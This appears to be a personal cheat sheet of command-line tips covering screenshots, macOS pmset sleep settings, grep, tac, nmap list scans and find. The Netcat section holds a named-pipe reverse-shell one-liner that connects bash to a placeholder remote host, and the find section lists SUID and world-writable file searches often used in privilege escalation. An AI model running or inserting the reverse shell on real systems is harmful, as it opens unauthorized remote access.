# Screenshots
## OS X
- Command-Shift-3: Full screen to desktop
- Command-Shift-4, select an area: Area to desktop
- Command-Shift-4, space, click a window: Window to desktop
- Command-Control-Shift-3: Full screen to clipboard
- Command-Control-Shift-4, select an area: Area to clipboard
- Command-Control-Shift-4, space, click a window: Window to clipboard

## Windows
- PrtScr: full screenshot to clipboard
- Windows-PrtScr: full screen to "Screenshots" folder
- Alt-PrtScr: active window to clipboard


# OS X Power Saving
- Temporarily turn off sleep
```
sudo pmset noidle
```
- Turn off sleep
```
sudo pmset sleep 0
```
- Sleep after 15 minutes
```
sudo pmset sleep 15
```

# Netcat
- When -e flag does not exist:
```
mknod /tmp/datapipe p
/bin/bash 0</tmp/datapipe | nc remote.host.com port 1>/tmp/datapipe
```

# grep
- multiple search terms:
```
grep -e term1 -e term2 <file>
```

- exclude term:
```
grep -v term <file>
```

- exclude multiple terms:
```
grep -v -e term1 -e term2 <file>
```

- Print file names and line numbers for matches:
```
grep -Hn term
```

- Case insensitive:
```
grep -i term <file>
```

- Strip # comments:
```
grep -v "^#" <file>
```

- Strip ; comments:
```
grep -v "^;" <file>
```

# tac (backwards cat)

This is part of the *GNU coreutils* package. It reads and prints a
file from the bottom up. VERY useful for logfiles.

- Linux
```
tac logfile | less
```

- OS X / BSD
```
gtac logfile | less
```

- BSD *tail -r*
```
tail -r logfile | less
```

# Using Nmap to generate lists of IP addresses

- Sometimes a tool will not allow you use CIDR notation to express
network addresses, or will require you to provide it a list of IP
addresses. Nmap provides the -sL (list scan) option that can generate
these lists easily, complete with host and network exclusion, ranges,
and so on:

```
nmap -n -sL 10.10.0.0/22 10.100.0.32/27 192.168.0.2-254 \
            --exclude 192.168.0.250,10.10.0.3.254       \
            | grep "Nmap scan report for"               \
            | awk {'print $5'}
```

- You can also omit the -n flag and easily resolve ranges of IP
addresses. If an IP address resolves, it will display "hostname (ip
address)". If it does not resolve, it will simply display the IP
address:


```
nmap -sL 10.10.0.0/22 | awk {'print $5, $6'}
```

# find

- Find suid binaries:

```
find / -perm -04000 -exec ls -l {} \; 2>/dev/null
```

- Find world-writable files:

```
find / -type f -perm -o=w -exec ls -l {} \; 2>/dev/null
```